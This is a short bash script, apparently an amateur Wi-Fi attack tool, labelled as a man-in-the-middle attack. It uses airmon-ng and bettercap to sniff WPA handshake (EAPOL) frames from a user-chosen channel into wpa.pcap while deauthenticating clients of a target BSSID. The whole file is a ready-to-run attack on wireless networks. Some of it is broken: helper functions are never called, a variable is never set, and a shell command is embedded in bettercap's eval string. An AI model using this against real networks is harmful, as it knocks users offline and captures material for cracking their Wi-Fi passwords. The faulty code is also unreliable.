#!/bin/bash

# === ASCII BANNER ===
echo -e "\e[1;36m
  __  __              _____   __  __   
U|' \/ '|u   ___     |_ " _|U|' \/ '|u 
\| |\/| |/  |_"_|      | |  \| |\/| |/ 
 | |  | |    | |      /| |\  | |  | |  
 |_|  |_|  U/| |\u   u |_|U  |_|  |_|  
<<,-,,-..-,_|___|_,-._// \\_<<,-,,-.   
 (./  \.)\_)-' '-(_/(__) (__)(./  \.)  
\e[0m"

# === Colors ===
cyan() { echo -e "\e[1;36m$1\e[0m" ;}
yellow() { echo -e "\e[1;33m[*] $*\e[0m"; }
red()    { echo -e "\e[1;31m[-] $*\e[0m"; }
green()  { echo -e "\e[1;32m[+] $*\e[0m"; }

# --- TOOL INSTALLATION CHECKS ---
cyan "Updating the system"
sudo apt update
sudo apt upgrade
sudo apt install bettercap
# ---------- Clean exit on Ctrl-C ----------
trap 'red "Interrupted. Cleaning up…"; sudo ip link set "$iface" down 2>/dev/null; exit 1' INT

# ---------- Detect adapter ----------
check_adapter()   { lsusb | grep -qi "Realtek"; }
driver_loaded()   { lsmod  | grep -q 88XXau;    }

load_driver() {
    if driver_loaded; then
        yellow "88XXau driver already loaded."
    else
        yellow "Loading driver 88XXau…"
        sudo modprobe 88XXau || { red "Driver load failed"; exit 1; }
        green "Driver loaded."
    fi
}
enable_monitor() {
			sudo airmon-ng check kill
			sudo airmon-ng start wlan0
		green "Adapter set to monitor mode completed"
}

# === Man-In-The-Middle === #
 yellow "Starting MITM Attack"
read -p $'\e[1;33m[*]  Enter target channel: \e[0m'  channel
read -p $'\e[1;33m[*]  Enter target  BSSID : \e[0m'  bssid
 
 bettercap -iface wlan0 -eval "
 wifi.recon on
 wifi.show
 set wifi.recon.channel "$channel"
 set net.sniff.verbose true
 set net.sniff.filter ether proto 0x888e
 set net.sniff.output wpa.pcap
 wifi.show
 cyan "Deauthenticating clients"
 wifi.deauth "$bssid"
 "
